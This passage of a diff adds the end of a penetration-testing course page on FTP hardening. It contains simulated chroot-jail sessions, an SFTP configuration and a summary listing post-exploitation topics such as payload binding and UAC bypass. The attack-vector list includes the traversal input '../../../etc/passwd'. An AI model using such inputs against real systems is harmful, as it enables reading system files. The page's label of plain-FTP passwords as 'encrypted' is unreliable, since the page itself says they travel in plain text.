+                        <li><strong>bob:</strong> Can only access /home/bob/ftp (home directory)</li>
+                        <li><strong>Admin/root:</strong> Cannot login via FTP (security best practice)</li>
+                        <li><strong>Chroot Jail:</strong> Each user confined to home directory (cannot traverse upward)</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>User-Based FTP Workflow</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Alice Connects via FTP</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>$ ftp 192.168.1.50
+Connected to 192.168.1.50.
+220 ProFTPD 1.3.5 Server
+Name: alice
+331 Password required for alice
+Password: **** (encrypted credentials)
+230 User alice logged in
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Alice Access Restricted to Home Directory</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>ftp> pwd
+257 "/home/alice/ftp" is current directory
+
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection
+-rw-r--r--  1 alice alice  2048  Apr 14 10:20 project_v1.zip
+-rw-r--r--  1 alice alice  1024  Apr 14 11:30 report.pdf
+226 Transfer complete
+
+ftp> cd ../../etc
+550 Access Denied (chroot jail prevents traversal)
+
+ftp> get project_v1.zip
+226 Transfer complete (2048 bytes downloaded)
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Bob Connects (Separate User)</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>$ ftp 192.168.1.50
+Connected to 192.168.1.50.
+220 ProFTPD 1.3.5 Server
+Name: bob
+331 Password required for bob
+Password: **** (encrypted credentials)
+230 User bob logged in
+
+ftp> pwd
+257 "/home/bob/ftp" is current directory
+
+ftp> ls
+200 PORT command successful
+150 Opening ASCII mode data connection
+-rw-r--r--  1 bob bob  5120  Apr 14 09:15 data_analysis.xlsx
+226 Transfer complete
+
+ftp> get data_analysis.xlsx
+226 Transfer complete (5120 bytes downloaded)
+
+# Bob CANNOT access alice's files - chroot jail enforces separation
+ftp> cd /home/alice
+550 Access Denied
+</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ Secure FTP Best Practices</h3>
+                    <ul>
+                        <li>Disable anonymous FTP access completely</li>
+                        <li>Use user-based authentication with strong passwords</li>
+                        <li>Implement chroot jails to restrict directory traversal</li>
+                        <li>Use SFTP (SSH-based) instead of plain FTP when possible</li>
+                        <li>Monitor FTP access logs for suspicious activities</li>
+                        <li>Restrict FTP access by IP address when possible</li>
+                        <li>Disable FTP commands (DELE, RMD, MKD) if not needed</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 16: Advanced FTP Authentication -->
+            <div class="tab-content" id="auth-methods">
+                <h2>Advanced Authentication & FTP Security Hardening</h2>
+                <p class="subtitle">Implementing Multi-Layer FTP Protection</p>
+
+                <div class="info-card">
+                    <h3>FTP Authentication Mechanisms</h3>
+                    <ul>
+                        <li><strong>Anonymous:</strong> No authentication (security risk - avoid)</li>
+                        <li><strong>Basic Authentication:</strong> Username/password in plain text (AVOID)</li>
+                        <li><strong>Hashed Passwords:</strong> MD5/SHA hashing (better but still transmitted plaintext)</li>
+                        <li><strong>SFTP (SSH-FTP):</strong> Encrypted channel + SSH key authentication (RECOMMENDED)</li>
+                        <li><strong>TLS/SSL (FTPS):</strong> FTP over encrypted tunnel (secure alternative)</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h4>SFTP Configuration (Encrypted FTP)</h4>
+                    <pre>$ sudo nano /etc/ssh/sshd_config
+
+# Enable SFTP subsystem
+Subsystem sftp /usr/lib/openssh/sftp-server
+
+# Restrict SFTP user to home directory
+Match User ftp_user
+    X11Forwarding no
+    AllowTcpForwarding no
+    PermitTTY no
+    ForceCommand internal-sftp
+    ChrootDirectory %h/
+
+$ sudo systemctl restart ssh
+</pre>
+                    <h4>SFTP Connection (Secure Alternative)</h4>
+                    <pre>$ sftp -P 22 alice@192.168.1.50
+Connected to 192.168.1.50
+sftp> ls
+project_v1.zip  report.pdf
+sftp> get project_v1.zip
+sftp> put local_file.txt remote_file.txt
+sftp> quit
+
+# All traffic encrypted via SSH protocol - credentials secure
+</pre>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ FTP Attack Vectors</h3>
+                    <ul>
+                        <li><strong>Brute Force:</strong> Automated password guessing (mitigate with rate limiting)</li>
+                        <li><strong>Sniffing:</strong> Tcpdump/Wireshark captures plain-text credentials</li>
+                        <li><strong>Man-in-Middle:</strong> Attacker intercepts FTP session</li>
+                        <li><strong>Directory Traversal:</strong> ../../../etc/passwd attempts</li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ FTP Security Hardening Checklist</h3>
+                    <ul>
+                        <li>✓ Disable anonymous FTP completely</li>
+                        <li>✓ Enforce strong passwords (min. 12 characters, complexity)</li>
+                        <li>✓ Implement account lockout after 5 failed attempts</li>
+                        <li>✓ Use SFTP instead of plain FTP</li>
+                        <li>✓ Restrict FTP access to specific IP ranges</li>
+                        <li>✓ Run FTP service with minimal privileges (dedicated user account)</li>
+                        <li>✓ Enable SSH key authentication</li>
+                        <li>✓ Monitor access logs for suspicious patterns</li>
+                        <li>✓ Keep FTP server software up-to-date (security patches)</li>
+                        <li>✓ Disable dangerous FTP commands (DELE, RMD, MKD, SITE)</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 17: Completion & Achievement -->
+            <div class="tab-content" id="summary">
+                <h2>Module 9 Completion & Achievement</h2>
+                <p class="subtitle">Congratulations on Completing Post-Exploitation & Server Security Training</p>
+
+                <div class="achievement-box">
+                    <h3>🎓 Module 9 Mastery Achieved</h3>
+                    <p>You have successfully completed comprehensive training in post-exploitation techniques and server security architecture.</p>
+                    
+                    <ul>
+                        <li>Mastered privilege escalation techniques (horizontal & vertical)</li>
+                        <li>Learned payload binding and evasion strategies</li>
+                        <li>Understood UAC bypass exploitation methods</li>
+                        <li>Gained expertise in IDS/IPS detection systems</li>
+                        <li>Learned web server deployment and security</li>
+                        <li>Implemented secure FTP architecture</li>
+                    </ul>
+                </div>
+
+                <div class="summary-grid">
+                    <div class="summary-card">
+                        <h3>Post-Exploitation Skills</h3>
+                        <ul>
+                            <li>Horizontal privilege escalation</li>
+                            <li>Vertical privilege escalation</li>
+                            <li>UAC bypass techniques</li>
+                            <li>Payload binding methods</li>
+                            <li>Multi-session coordination</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>Advanced Techniques</h3>
+                        <ul>
+                            <li>EXE binding and process injection</li>
+                            <li>Stealth payload delivery</li>
+                            <li>Multi-encoder payload obfuscation</li>
+                            <li>Session management in Metasploit</li>
+                            <li>Lateral movement strategies</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>Server Security</h3>
+                        <ul>
+                            <li>Web server architecture</li>
+                            <li>Apache HTTP server setup</li>
+                            <li>IIS vs NGINX comparison</li>
+                            <li>HTTP protocol fundamentals</li>
+                            <li>Server hardening practices</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>FTP & Network Security</h3>
+                        <ul>
+                            <li>FTP protocol vulnerabilities</li>
+                            <li>User-based authentication</li>
+                            <li>SFTP encrypted alternative</li>
+                            <li>Directory and access controls</li>
+                            <li>Security hardening checklist</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>Detection & Defense</h3>
+                        <ul>
+                            <li>IDS/IPS monitoring capabilities</li>
+                            <li>Log analysis and correlation</li>
+                            <li>Attack signature detection</li>
+                            <li>Behavioral anomaly detection</li>
+                            <li>Incident response procedures</li>
+                        </ul>
+                    </div>
+
+                    <div class="summary-card">
+                        <h3>Practical Lab Scenarios</h3>
+                        <ul>
+                            <li>Real-world privilege escalation</li>
+                            <li>Payload delivery simulations</li>
+                            <li>Web server deployment labs</li>
+                            <li>FTP security testing</li>
+                            <li>Detection system testing</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <h3>📚 Next Steps in Your CEH Journey</h3>
+                    <ul>
+                        <li><strong>Module 10:</strong> Wireless Network Hacking (WiFi, Bluetooth)</li>
+                        <li><strong>Module 11:</strong> Cryptography & Encryption Analysis</li>
+                        <li><strong>Module 12:</strong> Cloud Security & Virtual Infrastructure</li>
+                        <li><strong>Module 13:</strong> Incident Response & Forensics</li>
+                        <li><strong>Module 14:</strong> Ethics & Compliance in Penetration Testing</li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ Key Takeaways</h3>
+                    <ul>
+                        <li>Privilege escalation is a multi-stage process requiring understanding of system architecture</li>
+                        <li>Payload binding significantly increases attack success by maintaining user deception</li>
+                        <li>UAC/USC bypass is critical for vertical escalation on modern Windows systems</li>
+                        <li>Enterprise security requires defense-in-depth: firewall + IDS/IPS + SIEM + EDR</li>
+                        <li>FTP remains a critical infrastructure component; proper hardening is essential</li>
+                        <li>Web servers are frequent attack targets; security configuration is paramount</li>
+                    </ul>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ Ethical Reminders</h3>
+                    <p>All techniques in this course are for <strong>authorized penetration testing and defensive security purposes only</strong>. Unauthorized access to computer systems is illegal and unethical. Always:</p>
+                    <ul>
+                        <li>Obtain written authorization before testing any system</li>
+                        <li>Test only within agreed scope and timeframe</li>
+                        <li>Maintain confidentiality of findings</li>
+                        <li>Report vulnerabilities responsibly to system owners</li>
+                        <li>Respect privacy and data protection laws</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
